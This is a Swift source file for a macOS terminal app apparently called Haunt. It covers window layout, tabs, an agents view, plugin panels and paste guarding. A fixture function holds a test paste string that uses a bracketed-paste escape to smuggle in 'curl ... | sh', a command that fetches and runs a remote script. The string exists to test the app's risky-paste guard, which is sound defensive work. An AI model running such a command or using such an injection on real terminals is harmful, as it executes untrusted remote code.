import AppKit
import Combine
import GhosttyKit

/// `[effects] window.ring` (and the palette's): a light ring inside a rounded edge and a highlight along its top.
final class RingView: NSView {
    var radius: CGFloat = 0 { didSet { needsDisplay = true } }
    var ring = NSColor.clear { didSet { needsDisplay = true } }
    var highlight = NSColor.clear { didSet { needsDisplay = true } }

    override var isFlipped: Bool { true }
    override func hitTest(_ point: NSPoint) -> NSView? { nil }

    override func draw(_ dirtyRect: NSRect) {
        let hl = Tok.App.hairline
        let shape = NSBezierPath(roundedRect: bounds, xRadius: radius, yRadius: radius)
        shape.addClip()
        Draw.fill(NSRect(x: 0, y: 0, width: bounds.width, height: hl), highlight)
        let edge = NSBezierPath(roundedRect: bounds.insetBy(dx: hl / 2, dy: hl / 2), xRadius: max(radius - hl / 2, 0), yRadius: max(radius - hl / 2, 0))
        edge.lineWidth = hl
        ring.setStroke()
        edge.stroke()
    }
}

/// `ornament`'s watermark and corner marks, behind the content: shown only when the terminal's background lets them through.
final class WatermarkView: NSView {
    override var isFlipped: Bool { true }
    override func hitTest(_ point: NSPoint) -> NSView? { nil }

    override func draw(_ dirtyRect: NSRect) {
        guard Theme.current.effects.ornament == "sigil", let ctx = NSGraphicsContext.current?.cgContext else { return }
        ctx.clip(to: bounds)
        let app = Theme.current.app
        NSColor.white.withAlphaComponent(app.ornamentAlpha).setStroke()
        Draw.sigil(at: NSPoint(x: bounds.maxX + 60 - 520, y: bounds.minY - 40), size: 520, stroke: 1.2)
        let corners = [NSPoint(x: 6, y: 6), NSPoint(x: bounds.width - 52, y: 6),
                       NSPoint(x: bounds.width - 52, y: bounds.height - 52), NSPoint(x: 6, y: bounds.height - 52)]
        for (i, o) in corners.enumerated() {
            Draw.cornerOrnament(at: o, quarterTurns: i, bright: app.ornament, dim: app.ornamentDim, in: ctx)
        }
    }
}

/// Window artwork over the window's own views but under its overlays, drawn from `[effects]`: the border
/// and bevels.
final class OrnamentView: NSView {
    var pane = NSRect.zero { didSet { needsDisplay = true } }

    override var isFlipped: Bool { true }
    override func hitTest(_ point: NSPoint) -> NSView? { nil }

    override func draw(_ dirtyRect: NSRect) {
        guard let ctx = NSGraphicsContext.current?.cgContext else { return }
        let fx = Theme.current.effects, app = Theme.current.app
        if fx.ornament == "lcd" {
            // An LCD's pixel grid, every 3 pt, over all but the terminal.
            ctx.saveGState()
            ctx.addRect(bounds)
            ctx.addRect(pane)
            ctx.clip(using: .evenOdd)
            let c = app.ornament.withAlphaComponent(app.ornamentAlpha)
            for x in stride(from: CGFloat(0), to: bounds.width, by: 3) { Draw.fill(NSRect(x: x, y: 0, width: 1, height: bounds.height), c) }
            for y in stride(from: CGFloat(0), to: bounds.height, by: 3) { Draw.fill(NSRect(x: 0, y: y, width: bounds.width, height: 1), c) }
            ctx.restoreGState()
        }
        if fx.windowFrame == "bevel" { Draw.bevel(bounds, "out") }
        if fx.paneFrame == "bevel" { Draw.bevel(pane, "in") }
        if fx.windowBorder {
            let hl = Tok.App.hairline
            let edge = NSBezierPath(rect: bounds.insetBy(dx: hl / 2, dy: hl / 2))
            edge.lineWidth = hl
            Tok.Color.windowBorder.setStroke()
            edge.stroke()
        }
    }
}

/// Lays out title bar, sidebar and pane at fixed mockup sizes; without the sidebar, mockup 10's.
private final class RootView: NSView {
    let titleBar = TitleBarView()
    let sidebar = SidebarView()
    let topRow = TopRowView()
    let pane = NSView()
    /// The palette mockup's scrim over everything below the title bar.
    let scrim = NSView()
    let agents = AgentsView()
    /// What Haunt refused on the user's behalf or a plugin copied, at the sidebar's foot so it never covers the terminal.
    let toast = ToastView()
    /// `[effects] window.material = "glass"`: the desktop, blurred, behind everything.
    let material = NSVisualEffectView()
    let ring = RingView()
    let ornaments = OrnamentView()
    let watermark = WatermarkView()
    /// A fixture's stand-in for the desktop behind glass (HAUNT_BACKDROP), so captures don't depend on the wallpaper.
    var backdrop: NSImageView? {
        didSet {
            guard let backdrop else { return }
            addSubview(backdrop, positioned: .below, relativeTo: material)
            setLayerColors()
        }
    }
    var sidebarW = Tok.Size.sidebarW
    /// The review inbox covers the sidebar too; a tab's review only the pane.
    var reviewCoversSidebar = false
    /// The review screen, over the terminal pane; the pane hides so no surface takes keys under it.
    var review: NSView? {
        didSet {
            oldValue?.removeFromSuperview()
            if let review { addSubview(review, positioned: .below, relativeTo: scrim) }
            pane.isHidden = review != nil || agentsOn
            needsLayout = true
        }
    }

    /// A plugin's right-hand panel, beside the terminal (`PluginPanels`).
    var rightPane: NSView? {
        didSet {
            oldValue?.removeFromSuperview()
            if let rightPane { addSubview(rightPane, positioned: .below, relativeTo: scrim) }
            needsLayout = true
        }
    }

    var sidebarHidden = false {
        didSet {
            titleBar.zen = sidebarHidden
            sidebar.isHidden = sidebarHidden || agentsOn
            needsLayout = true
        }
    }

    /// The agents-only view covers the window; the panes keep their last frames so no terminal resizes.
    var agentsOn = false {
        didSet {
            agents.isHidden = !agentsOn
            titleBar.isHidden = agentsOn
            pane.isHidden = agentsOn
            sidebar.isHidden = agentsOn || sidebarHidden
            needsLayout = true
        }
    }

    override var isFlipped: Bool { true }

    override init(frame: NSRect) {
        super.init(frame: frame)
        pane.wantsLayer = true
        scrim.wantsLayer = true
        setLayerColors()
        scrim.isHidden = true
        agents.isHidden = true
        material.material = .hudWindow
        material.blendingMode = .behindWindow
        material.state = .active
        for v in [material, watermark, titleBar, sidebar, topRow, pane, ornaments, scrim, agents, toast, ring] { addSubview(v) }
    }

    required init?(coder: NSCoder) { fatalError() }

    func setLayerColors() {
        pane.layer?.backgroundColor = Tok.Color.windowBg.cgColor
        scrim.layer?.backgroundColor = Tok.App.scrim.withAlphaComponent(Tok.Size.paletteScrimAlpha).cgColor
        let fx = Theme.current.effects
        material.isHidden = fx.windowMaterial != "glass" || backdrop != nil
        ring.isHidden = !fx.windowRing
        ring.radius = fx.windowRadius
        ring.ring = Theme.current.app.windowRing
        ring.highlight = Theme.current.app.windowHighlight
        layer?.cornerRadius = fx.windowSquare ? 0 : fx.windowRadius
        layer?.masksToBounds = fx.windowRadius > 0 || fx.windowSquare
        ornaments.isHidden = fx.ornament != "lcd" && !fx.windowBorder && fx.windowFrame == "none" && fx.paneFrame == "none"
        ornaments.needsDisplay = true
        watermark.isHidden = fx.ornament == "none" || !Theme.current.app.terminalSeeThrough
        watermark.needsDisplay = true
    }

    override func layout() {
        super.layout()
        agents.frame = bounds
        material.frame = bounds
        backdrop?.frame = bounds
        ring.frame = bounds
        ornaments.frame = bounds
        if agentsOn {
            toast.frame = toast.frame(in: bounds)
            return
        }
        // A bevelled window keeps its frame clear; a sunken pane stands off the sidebar and the title bar.
        let app = Theme.current.app, fx = Theme.current.effects
        let pad = fx.windowFrame == "bevel" ? app.windowPad : 0
        let sunk = fx.paneFrame == "bevel"
        let inner = bounds.insetBy(dx: pad, dy: pad)
        let top = TitleBarView.height(zen: sidebarHidden), w = sidebarHidden ? 0 : sidebarW
        let bodyTop = inner.minY + top + (sunk ? app.paneGap / 2 : 0), gap = sunk && !sidebarHidden ? app.paneGap : 0
        titleBar.frame = NSRect(x: inner.minX, y: inner.minY, width: inner.width, height: top)
        let topH = sidebarHidden ? 0 : topRow.height
        topRow.isHidden = topH == 0
        topRow.frame = NSRect(x: inner.minX, y: bodyTop, width: sidebarW, height: topH)
        sidebar.frame = NSRect(x: inner.minX, y: bodyTop + topH, width: sidebarW, height: inner.maxY - bodyTop - topH)
        // Without the sidebar, the title bar's right half: its title sits on the left.
        toast.frame = sidebarHidden
            ? toast.frame(in: NSRect(x: bounds.width / 2, y: 0, width: bounds.width / 2, height: top))
            : toast.frame(in: sidebar.frame)
        let paneW = (rightPane as? RightPane)?.width ?? PluginPanels.rightWidth
        let rightW = rightPane == nil ? 0 : min(paneW, max(inner.width - w - gap - Tok.App.minPaneW, 0))
        let paneBox = NSRect(x: inner.minX + w + gap, y: bodyTop, width: inner.width - w - gap - rightW, height: inner.maxY - bodyTop)
        pane.frame = sunk ? paneBox.insetBy(dx: 2, dy: 2) : paneBox
        rightPane?.frame = NSRect(x: inner.maxX - rightW, y: bodyTop, width: rightW, height: inner.maxY - bodyTop)
        ornaments.pane = paneBox
        watermark.frame = pane.frame
        review?.frame = reviewCoversSidebar ? NSRect(x: 0, y: top, width: bounds.width, height: bounds.height - top) : pane.frame
        scrim.frame = NSRect(x: 0, y: top, width: bounds.width, height: bounds.height - top)
    }
}

final class MainWindowController: NSWindowController, NSWindowDelegate, PanelHost {
    private let core: CoreAPI
    private let ghostty: Ghostty.App
    private let fixture: Fixture?
    /// The mockups' window size in points.
    private static let defaultSize = NSSize(width: Tok.App.windowW, height: Tok.Size.windowH)
    private let config: HauntConfig
    private let store = TabStore()
    let bridge: PluginBridge
    private lazy var pasteGuard = PasteGuard(window: window) { [weak self] view in
        guard let self, let tab = self.store.tab(for: view), tab.env.surfaceId != self.store.selectedId else { return }
        self.select(tab.env.surfaceId)
    }
    private lazy var palette: PaletteController = {
        let p = PaletteController(host: self)
        p.sticky = fixture != nil
        #if HAUNT_FIXTURES
        if let n = fixture?.paletteRows { p.maxRows = n }
        #endif
        return p
    }()
    private let root = RootView()
    var tabs: [Tab] { store.tabs }
    private var observers: [NSObjectProtocol] = []
    private var keyMonitor: Any?
    /// The core's branch lookup can stall on a dead mount the shell's cwd points at; serial keeps each surface's updates in order.
    private let infoQueue = DispatchQueue(label: "haunt.surface-info", qos: .utility)
    /// For when a running subagent's elapsed time next reads differently: one timer, its fire date moved
    /// to each deadline and parked in the distant future between them.
    private var ticker: Timer?
    /// Every snapshot the sidebar gets, for notifications and the menu bar item.
    var onSnapshot: ((SidebarSnapshot) -> Void)?
    /// The version of the snapshot on screen; 0 is older than any the core makes.
    private var shownVersion: UInt64 = 0
    /// Applied in showWindow, once the window has its launch position to restore to.
    private var agentsViewAtLaunch = false
    /// The core fires once per burst of changes and re-arms on the next snapshot, so each call is one redraw.
    private lazy var listener = MainQueueListener { [weak self] in
        self?.refreshIfNewer()
        self?.bridge.drain()
    }
    private lazy var reviewer = ReviewCoordinator(host: self)

    init(core: CoreAPI, ghostty: Ghostty.App, fixture: Fixture?, config: HauntConfig) {
        self.core = core
        self.ghostty = ghostty
        self.fixture = fixture
        self.config = config
        bridge = PluginBridge(core: core) { [store] route in
            switch route {
            case let .press(key, surfaceId):
                store.press(key, to: surfaceId)
            case let .paste(w):
                store.write(w.bytes, to: w.surfaceId)
                if w.enter { store.pressReturn(w.surfaceId) }
            }
        }
        let size = fixture?.size ?? Self.defaultSize
        let win = NSWindow(contentRect: NSRect(origin: .zero, size: size),
                           styleMask: [.titled, .closable, .miniaturizable, .resizable, .fullSizeContentView],
                           backing: .buffered, defer: false)
        // Hidden in the title bar; still names the window in the Window menu and to accessibility.
        win.title = "Haunt"
        win.titleVisibility = .hidden
        win.titlebarAppearsTransparent = true
        win.colorSpace = .sRGB
        win.appearance = Tok.App.appearance
        Self.setBackground(win)
        win.minSize = NSSize(width: Tok.Size.sidebarW + Tok.App.minPaneW, height: Tok.App.minWindowH)
        win.tabbingMode = .disallowed
        for b in [NSWindow.ButtonType.closeButton, .miniaturizeButton, .zoomButton] {
            win.standardWindowButton(b)?.isHidden = true
        }
        win.contentView = root
        super.init(window: win)
        win.delegate = self
        bridge.panels.host = self
        bridge.openTab = { [weak self] id in
            KeyGuard.shared.pluginOpen(id, at: ProcessInfo.processInfo.systemUptime) { self?.open($0) ?? false }
        }
        bridge.onNote = { [weak self] line in self?.root.toast.show(line) }
        root.topRow.onClick = { [weak self] plugin in self?.bridge.topRowClicked(pluginId: plugin) }
        root.sidebar.onHover = { [weak self] id in self?.bridge.hover.pointer(over: id) }
        bridge.hover.canHold = { [weak win, weak root] in win?.isKeyWindow == true && root?.sidebar.isHidden == false }

        #if HAUNT_FIXTURES
        if fixture != nil, let path = ProcessInfo.processInfo.environment["HAUNT_BACKDROP"], let image = NSImage(contentsOfFile: path) {
            let v = NSImageView()
            v.image = image
            v.imageScaling = .scaleAxesIndependently
            root.backdrop = v
        }
        #endif
        root.titleBar.accessory = fixture?.titleAccessory ?? .icons
        root.sidebarW = fixture?.sidebarWidth ?? Tok.Size.sidebarW
        root.titleBar.onIcon = { [weak self] icon in self?.titleIcon(icon) }
        root.titleBar.onHint = { [weak self] hint in
            switch hint {
            case .agents: self?.toggleSidebar()
            case .search: self?.togglePalette()
            }
        }
        // Fixtures neither read nor overwrite the user's saved state.
        root.sidebarHidden = fixture?.sidebarHidden ?? config.state.sidebarHidden
        agentsViewAtLaunch = fixture?.agentsView ?? config.state.agentsView
        updateKeys(config.keys)
        root.titleBar.buttons = fixture?.titlebarButtons ?? config.titlebarButtons
        root.titleBar.titleFormat = config.titleFormat
        root.sidebar.onSelect = { [weak self] id in self?.select(id) }
        root.sidebar.onClose = { [weak self] id in self?.closeTab(id) }
        root.agents.list.onSelect = { [weak self] id in self?.expandAgentsView(to: id) }
        root.agents.list.onClose = { [weak self] id in self?.closeTab(id) }
        root.sidebar.onRename = { [weak self] id, name in
            self?.store.customNames[id] = name.isEmpty ? nil : name
            self?.refresh()
        }
        root.sidebar.onRenameEnd = { [weak self] in self?.focusSelectedSurface() }
        root.sidebar.rowMenu = { [weak self] id in
            defer { self?.bridge.drain() }
            return self?.bridge.plugins?.rowMenuItems(surfaceId: id) ?? []
        }
        root.sidebar.onRowMenu = { [weak self] item, id in self?.bridge.invokeRowMenu(item, surfaceId: id) }
        root.sidebar.onRowMoved = { [weak self] id, group, before in
            self?.bridge.plugins?.rowMoved(surfaceId: id, groupId: group, beforeSurfaceId: before)
            self?.bridge.drain()
        }
        bridge.onRefused = { [weak self] line in self?.root.toast.show(line) }
        core.setListener(listener: listener)
        core.setScreenReader(reader: TabScreenReader { [weak self] id in self?.store.visibleText(id) })

        let nc = NotificationCenter.default
        observers.append(nc.addObserver(forName: Ghostty.Notification.ghosttyCloseSurface, object: nil, queue: .main) { [weak self] n in
            guard let view = n.object as? Ghostty.SurfaceView else { return }
            self?.surfaceWantsClose(view, processAlive: n.userInfo?["process_alive"] as? Bool ?? false)
        })
        // A key pressed in the palette, a sheet or a panel, or a window becoming key, starts no hold a
        // terminal may repeat: even into the tab that was already selected, which never re-becomes first responder.
        observers.append(nc.addObserver(forName: NSWindow.didBecomeKeyNotification, object: nil, queue: .main) { _ in
            KeyGuard.shared.focusMoved()
        })
        keyMonitor = NSEvent.addLocalMonitorForEvents(matching: .keyDown) { e in
            KeyGuard.shared.sawKeyDown(inTerminal: e.window?.firstResponder is HauntSurfaceView)
            return e
        }
    }

    required init?(coder: NSCoder) { fatalError() }

    func tab(for view: Ghostty.SurfaceView) -> Tab? { store.tab(for: view) }

    // MARK: Tabs

    func newTab(cwd: String? = nil, select selectIt: Bool = true) {
        guard let app = ghostty.app else { return }
        let dir = cwd ?? store.selected?.view.pwd ?? NSHomeDirectory()
        // The core refuses past its surface cap; no tab beats an unverifiable one.
        guard let env = try? core.registerSurface(cwd: dir) else { NSSound.beep(); return }
        var config = Ghostty.SurfaceConfiguration()
        config.workingDirectory = dir
        config.environmentVariables = [
            "HAUNT": "1",
            "HAUNT_SURFACE_ID": env.surfaceId,
            "HAUNT_HOOK_NONCE": env.nonce,
            "HAUNT_SOCK": env.socketPath,
        ]
        if let fixture = fixtureCommand() { config.command = fixture }
        let view = HauntSurfaceView(app, baseConfig: config, uuid: nil)
        // Before the keystroke reaches the pty, so a late Allow/Deny can't be typed into a running tool.
        view.onInput = { [weak self] in self?.core.onUserInput(surfaceId: env.surfaceId) }
        view.onPasteConfirmation = { [weak self, weak view] req in
            if let view { self?.pasteGuard.confirm(req, on: view) }
        }
        view.isPluginCopy = { [weak self] id in self?.bridge.copiedBy(id) ?? false }
        view.surfaceId = env.surfaceId
        view.awaitsAnswer = { [weak self] in self?.core.hasUnresolved(surfaceId: env.surfaceId) ?? false }
        view.onRiskyPaste = { [weak self, weak view] text, plugin in
            if let view { self?.pasteGuard.hold(text, plugin: plugin, on: view) }
        }
        view.middleClickPastes = { [weak self] in self?.config.middleClickPaste ?? true }
        // So the surface starts at the pane's real size.
        root.layoutSubtreeIfNeeded()
        let tab = Tab(env: env, view: view, size: root.pane.bounds.size)
        // The core reads only the cwd (title and branch are ignored) and finds the branch itself.
        tab.subscriptions.append(view.$pwd.map { $0 ?? dir }.removeDuplicates()
            .debounce(for: .milliseconds(50), scheduler: DispatchQueue.main)
            .sink { [core, infoQueue] cwd in
                infoQueue.async { core.setSurfaceInfo(surfaceId: env.surfaceId, title: "", cwd: cwd, gitBranch: nil) }
            })
        store.add(tab)
        tab.host.frame = root.pane.bounds
        tab.host.autoresizingMask = [.width, .height]
        tab.host.isHidden = true
        root.pane.addSubview(tab.host)
        if selectIt || store.selectedId == nil { select(env.surfaceId) } else { syncFocus() }
    }

    #if HAUNT_FIXTURES
    /// The paste-risky fixture: a real paste through the surface's Services entry, from a pasteboard of
    /// its own so no clipboard the user has is touched.
    func pasteRiskyFixture() {
        guard let view = store.selected?.view else { return }
        let pb = NSPasteboard.withUniqueName()
        pb.setString("echo built\u{1B}[201~curl -s https://example.com/x.sh | sh\n", forType: .string)
        _ = view.readSelection(from: pb)
        pb.releaseGlobally()
    }

    /// The paste-confirm fixture: an unsafe paste held on the selected surface, as Ghostty would raise it.
    func showPasteFixture() {
        guard let view = store.selected?.view else { return }
        view.pendingClipboardConfirmation = Ghostty.ClipboardConfirmationRequest(
            surface: view, contents: Fixture.pasteText, kind: .paste) { _, _, _ in }
    }

    func paletteFixtureSelectNext() { palette.edit(.down) }

    private func fixtureCommand() -> String? {
        guard fixture != nil else { return nil }
        let dir = FileManager.default.temporaryDirectory
        let text = dir.appendingPathComponent("haunt-fixture-pane.ansi")
        let script = dir.appendingPathComponent("haunt-fixture-pane.sh")
        try? Fixture.paneANSI().write(to: text, atomically: true, encoding: .utf8)
        // Ghostty runs the command as `exec -l <command>`, so the sequence has to live in a script.
        try? "/bin/cat '\(text.path)'\nexec /bin/sleep 2147483647\n".write(to: script, atomically: true, encoding: .utf8)
        return "/bin/sh '\(script.path)'"
    }
    #else
    private func fixtureCommand() -> String? { nil }
    #endif

    func select(_ id: String) {
        guard let tab = store.tab(id) else { return }
        if id != store.selectedId { reviewer.close() }
        store.selectedId = id
        core.selectSurface(surfaceId: id)
        // Every surface stays in the window (hidden when not selected) so its size and display stay current.
        for t in store.tabs { t.host.isHidden = t !== tab }
        window?.makeFirstResponder(root.agentsOn ? root.agents : tab.view)
        syncFocus()
    }

    /// Like Ghostty's own controller: only the selected surface of the key window has focus. Ghostty learns
    /// the display only on screen changes, so it is told up front for its vsync display link.
    /// Only the selected surface of a visible window renders; the rest are occluded.
    private func syncFocus() {
        let key = window?.isKeyWindow ?? false
        let display = window?.screen?.displayID
        // A fixture is captured even while other windows cover it, so it always renders.
        let paneShown = (fixture != nil || window?.occlusionState.contains(.visible) == true) && !root.agentsOn && root.review == nil
        for t in store.tabs {
            let selected = t.env.surfaceId == store.selectedId
            t.view.focusDidChange(key && selected && t.view.isFirstResponder)
            guard let surface = t.view.surface else { continue }
            ghostty_surface_set_occlusion(surface, paneShown && selected)
            if let display { ghostty_surface_set_display_id(surface, display) }
            if selected { ghostty_surface_refresh(surface) }
        }
    }

    /// ⌘1–9 follow the sidebar's display order.
    func select(index: Int) {
        let ids = root.sidebar.orderedIds
        if ids.indices.contains(index) { select(ids[index]) }
    }

    /// Next (+1) or previous (-1) tab in sidebar order, wrapping around.
    func selectAdjacent(_ step: Int) {
        let ids = root.sidebar.orderedIds
        guard !ids.isEmpty else { return }
        let i = store.selectedId.flatMap(ids.firstIndex(of:)) ?? 0
        select(ids[((i + step) % ids.count + ids.count) % ids.count])
    }

    func closeSelectedTab() {
        if let id = store.selectedId { closeTab(id) }
    }

    /// Like ⌘W on that tab: Ghostty asks for confirmation when a process is running.
    func closeTab(_ id: String) {
        guard let surface = store.tab(id)?.view.surface else { return }
        ghostty.requestClose(surface: surface)
    }

    private func surfaceWantsClose(_ view: Ghostty.SurfaceView, processAlive: Bool) {
        guard let tab = tab(for: view), let window else { return }
        guard processAlive else { return remove(tab) }
        let alert = NSAlert()
        alert.messageText = "Close this tab?"
        alert.informativeText = "A process is still running in it."
        alert.addButton(withTitle: "Close")
        alert.addButton(withTitle: "Cancel")
        alert.beginSheetModal(for: window) { [weak self] r in
            if r == .alertFirstButtonReturn { self?.remove(tab) }
        }
    }

    private func remove(_ tab: Tab) {
        guard store.tabs.contains(where: { $0 === tab }) else { return }
        let order = root.sidebar.orderedIds
        let pos = order.firstIndex(of: tab.env.surfaceId)
        tab.subscriptions.removeAll()
        tab.host.removeFromSuperview()
        store.remove(tab)
        core.unregisterSurface(surfaceId: tab.env.surfaceId)
        guard let first = store.tabs.first else {
            window?.close()
            return
        }
        if store.selectedId == tab.env.surfaceId {
            let rest = order.filter { $0 != tab.env.surfaceId }
            let next = pos.map { rest[min($0, rest.count - 1)] } ?? first.env.surfaceId
            select(next)
        }
        refresh()
    }

    // MARK: Core

    /// Elapsed times change without a core event, so a tick or a UI change takes a full snapshot.
    func refresh() { show(core.snapshot()) }

    /// A listener call: nothing to redraw unless the core has moved past the snapshot on screen.
    private func refreshIfNewer() {
        if let snap = core.snapshotIfNewer(version: shownVersion) { show(snap) }
    }

    /// Fires when the core says the next elapsed time changes, and only while the window can be seen;
    /// becoming visible again catches up with a full refresh.
    private func scheduleTick(in ms: UInt64?) {
        guard let ms, window?.occlusionState.contains(.visible) == true else {
            if let t = ticker, t.fireDate != .distantFuture { t.fireDate = .distantFuture }
            return
        }
        let interval = TimeInterval(ms) / 1000, slack = min(interval * 0.1, 0.1)
        let due = Date(timeIntervalSinceNow: interval)
        let t = ticker ?? makeTicker()
        guard abs(t.fireDate.timeIntervalSince(due)) > slack else { return }
        t.tolerance = slack
        t.fireDate = due
    }

    /// Repeats only so that it can be rescheduled; its interval never comes round.
    private func makeTicker() -> Timer {
        let t = Timer(fire: .distantFuture, interval: 1e9, repeats: true) { [weak self] _ in self?.refresh() }
        RunLoop.main.add(t, forMode: .common)
        ticker = t
        return t
    }

    private func show(_ raw: SidebarSnapshot) {
        shownVersion = raw.version
        scheduleTick(in: raw.nextTickMs)
        let snap = store.named(raw)
        if snap != root.sidebar.snapshot { root.sidebar.snapshot = snap }
        root.topRow.row = snap.top
        if root.agentsOn { root.agents.update(snap) }
        let sel = snap.groups.lazy.flatMap(\.rows).first { $0.selected }
        root.titleBar.progress = sel?.progress.map { $0.total == 0 ? 0 : CGFloat($0.done) / CGFloat($0.total) }
        root.titleBar.tab = sel.map { ($0.name, $0.meta) }
        onSnapshot?(snap)
    }

    /// Surface ids in the sidebar's order, the order ⌘1–9 select.
    var sidebarOrder: [String] { root.sidebar.orderedIds }

    /// Brings the window forward on that tab: a notification's Open tab, a menu bar row.
    /// False when there is no such tab or window, so nothing was brought forward.
    @discardableResult
    func open(_ surfaceId: String) -> Bool {
        guard tabs.contains(where: { $0.env.surfaceId == surfaceId }), let window else { return false }
        NSApp.activate(ignoringOtherApps: true)
        if window.isMiniaturized { window.deminiaturize(nil) }
        window.makeKeyAndOrderFront(nil)
        expandAgentsView(to: surfaceId)
        return true
    }

    /// The tab the user is looking at: selected, in the frontmost app, in a window on screen, its terminal
    /// not hidden by the agents view.
    func isFocused(_ surfaceId: String) -> Bool {
        NSApp.isActive && !root.agentsOn && store.selectedId == surfaceId && window?.isVisible == true
            && window?.isMiniaturized == false
    }

    /// Writes bytes the core returned for a surface; see `TabStore.write`.
    func press(_ key: AnswerKey, to surfaceId: String) { store.press(key, to: surfaceId) }

    // MARK: Sidebar, palette, keys

    var isSidebarHidden: Bool { root.sidebarHidden }

    var onSidebarToggle: (() -> Void)?

    var isRenaming: Bool { root.sidebar.isRenaming }

    func renameSelectedTab(text: String? = nil) {
        guard let id = store.selectedId else { return }
        if root.sidebarHidden { toggleSidebar() }
        root.sidebar.beginRename(id, text: text)
    }

    func setCustomName(_ name: String, at index: Int) {
        let ids = root.sidebar.orderedIds
        guard ids.indices.contains(index) else { return }
        store.customNames[ids[index]] = name
        refresh()
    }

    func toggleSidebar() {
        root.sidebarHidden.toggle()
        onSidebarToggle?()
        root.layoutSubtreeIfNeeded()
        if fixture == nil { config.updateState { $0.sidebarHidden = root.sidebarHidden } }
    }

    /// The zen hint and anything else that shows a shortcut follow the `[keys]` table.
    func updateKeys(_ keys: KeyMap) {
        func hint(_ a: KeyMap.Action, _ word: String) -> String {
            keys[a].map { "\($0.display) \(word)" } ?? word
        }
        root.titleBar.hints = [(.agents, hint(.toggleSidebar, "agents")), (.search, hint(.palette, "search"))]
        root.titleBar.shortcuts = Dictionary(uniqueKeysWithValues: TitlebarButton.allCases.compactMap { b in keys[b.action].map { (b, $0.display) } })
        root.agents.shortcut = AgentsView.mockupDisplay(keys[.agentsView])
    }

    func updateTitlebarButtons(_ buttons: [TitlebarButton]) {
        root.titleBar.buttons = fixture?.titlebarButtons ?? buttons
    }

    func updateTitleFormat(_ format: String) {
        root.titleBar.titleFormat = format
    }

    /// A glass or rounded theme needs a see-through window, its shape drawn by the root view.
    private static func setBackground(_ win: NSWindow) {
        let fx = Theme.current.effects
        let clear = fx.windowMaterial == "glass" || fx.windowRadius > 0 || fx.windowSquare
        win.isOpaque = !clear
        win.backgroundColor = clear ? .clear : Tok.Color.windowBg
        win.invalidateShadow()
    }

    /// Everything drawn from tokens draws again; colours held outside `draw` are set again.
    func themeDidChange() {
        guard let window else { return }
        window.appearance = Tok.App.appearance
        Self.setBackground(window)
        root.setLayerColors()
        root.sidebarW = fixture?.sidebarWidth ?? Tok.Size.sidebarW
        root.sidebar.themeDidChange()
        palette.themeDidChange()
        reviewer.themeDidChange()
        Self.redraw(root)
    }

    private static func redraw(_ v: NSView) {
        v.needsLayout = true
        v.needsDisplay = true
        v.subviews.forEach(redraw)
    }

    func togglePalette() {
        if palette.isOpen { return palette.close() }
        // The 400 pt palette doesn't fit the 278 pt strip.
        if root.agentsOn { return NSSound.beep() }
        openPalette()
    }

    func openPalette(text: String = "") {
        guard let window else { return }
        root.scrim.isHidden = !Theme.current.effects.paletteScrim
        palette.layout = config.paletteLayout
        palette.open(over: window, top: TitleBarView.height(zen: root.sidebarHidden) + Tok.Size.paletteTop, text: text)
    }

    /// The core keeps running without its socket; agent rows then only get OSC status.
    func showStartError(_ error: Error) {
        guard let window else { return }
        let alert = NSAlert()
        alert.messageText = "Haunt can't receive agent events"
        alert.informativeText = "The hook socket didn't start: \(error). Agent rows will only show basic status."
        alert.beginSheetModal(for: window)
    }

    /// Plugin requests waiting since the last core event; the app delegate drains once at launch.
    func drainPluginRequests() { bridge.drain() }

    func setRightPane(_ view: NSView?) { root.rightPane = view }
    func rightPaneWidth(plugin: String) -> CGFloat? { config.state.rightPaneWidths[plugin].map { CGFloat($0) } }
    func setRightPaneWidth(_ width: CGFloat, plugin: String) {
        if fixture == nil { config.updateState { $0.rightPaneWidths[plugin] = Double(width) } }
    }

    // MARK: Title bar

    private func titleIcon(_ icon: TitleBarView.Icon) {
        switch icon {
        case .search: togglePalette()
        case .newTab: newTab()
        case .settings: (NSApp.delegate as? AppDelegate)?.openSettings(nil)
        case .sidebar: toggleSidebar()
        }
    }

    // MARK: Agents-only view

    var isAgentsViewOn: Bool { root.agentsOn }

    override func showWindow(_ sender: Any?) {
        if agentsViewAtLaunch {
            agentsViewAtLaunch = false
            setAgentsView(true, animate: false)
        }
        super.showWindow(sender)
    }

    func toggleAgentsView() {
        setAgentsView(!root.agentsOn, animate: true)
        if fixture == nil { config.updateState { $0.agentsView = root.agentsOn } }
    }

    /// A row click: the full window comes back on that tab.
    private func expandAgentsView(to id: String) {
        if root.agentsOn { toggleAgentsView() }
        select(id)
    }

    private func setAgentsView(_ on: Bool, animate: Bool) {
        guard let window, on != root.agentsOn else { return }
        if window.styleMask.contains(.fullScreen) { return NSSound.beep() }
        if on {
            reviewer.close()
            if palette.isOpen { palette.close() }
            root.agents.restore = (window.frame, window.minSize, window.maxSize)
            root.agentsOn = true
            // The strip neither zooms nor goes full screen (windowShouldZoom), whatever asks.
            window.collectionBehavior.insert(.fullScreenNone)
            refresh()
            // A fixed width, so macOS tiling (Fill, an edge drag, the green button's menu) can't widen the strip.
            let stripW = Tok.Size.narrowW - 2 * Tok.App.hairline
            window.minSize = NSSize(width: stripW, height: Tok.App.narrowMinH)
            window.maxSize = NSSize(width: stripW, height: .greatestFiniteMagnitude)
            let frame = AgentsView.dockedFrame(on: window.screen ?? NSScreen.main, height: fixture == nil ? nil : Fixture.narrowHeight)
            window.setFrame(frame, display: true, animate: animate)
            window.makeFirstResponder(root.agents)
        } else {
            // Grow first, then lay the panes out once at their full size.
            window.collectionBehavior.remove(.fullScreenNone)
            if let r = root.agents.restore {
                window.maxSize = r.maxSize
                let frame = AgentsView.restoredFrame(r.frame, screens: NSScreen.screens.map(\.visibleFrame),
                                                     current: (window.screen ?? NSScreen.main)?.visibleFrame)
                window.setFrame(frame, display: true, animate: animate)
                window.minSize = r.minSize
            }
            root.agents.restore = nil
            root.agentsOn = false
            root.layoutSubtreeIfNeeded()
            if let tab = store.selected { window.makeFirstResponder(tab.view) }
        }
        syncFocus()
    }

    // MARK: NSWindowDelegate

    func windowShouldClose(_ sender: NSWindow) -> Bool {
        guard ghostty.needsConfirmQuit else { return true }
        let alert = NSAlert()
        alert.messageText = "Close the window?"
        alert.informativeText = "Processes are still running in its tabs."
        alert.addButton(withTitle: "Close")
        alert.addButton(withTitle: "Cancel")
        alert.beginSheetModal(for: sender) { r in
            if r == .alertFirstButtonReturn { sender.close() }
        }
        return false
    }

    func windowShouldZoom(_ window: NSWindow, toFrame newFrame: NSRect) -> Bool { !root.agentsOn }

